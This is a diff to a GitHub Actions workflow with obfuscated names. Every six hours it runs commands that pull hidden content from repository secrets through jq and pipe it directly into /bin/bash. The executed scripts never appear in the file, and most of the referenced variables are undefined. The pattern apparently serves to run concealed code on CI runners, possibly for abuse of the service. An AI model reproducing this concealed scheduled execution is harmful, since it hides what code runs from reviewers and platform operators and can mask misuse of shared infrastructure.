@@ -3,7 +3,8 @@ name: niubajiao4328
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 5/6 * * *'
+    - cron: '23 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: niubajiao4328
         env:
-          eki571: ${{ secrets.eki571 }}
+          jc3: ${{ secrets.jc3 }}
         run: |
-          echo $eki571 | jq -r .hu832 | /bin/bash
-          echo $cd96178 | jq -r .vno21 | /bin/bash
-          echo $kb50795 | jq -r .v59728 | /bin/bash
-          echo $i88283 | jq -r .gu82 | /bin/bash
-          echo $zmfbk2034 | jq -r .mu44 | /bin/bash
-          echo $bslin424 | jq -r .ebme968 | /bin/bash
-          echo $qw98 | jq -r .unkh34423 | /bin/bash
-          echo $zqvo74875 | jq -r .vqj660 | /bin/bash
-          echo $i030 | jq -r .tkzzd023 | /bin/bash
-          echo $hsknb89 | jq -r .nbuum645 | /bin/bash
-          echo $if851 | jq -r .ffgg932 | /bin/bash
-          echo $i9 | jq -r .epf28877 | /bin/bash
-          echo $bneuj51 | jq -r .ibox74724 | /bin/bash
-          echo $wjwwy5290 | jq -r .w99 | /bin/bash
+          echo $jc3 | jq -r .hmdz0 | /bin/bash
+          echo $u8 | jq -r .uwvy3 | /bin/bash
+          echo $h99523 | jq -r .h587 | /bin/bash
+          echo $ayqo849 | jq -r .prh6041 | /bin/bash
+          echo $twvh9 | jq -r .kg039 | /bin/bash
+          echo $y4939 | jq -r .bo3 | /bin/bash
+          echo $jj385 | jq -r .s24522 | /bin/bash
 
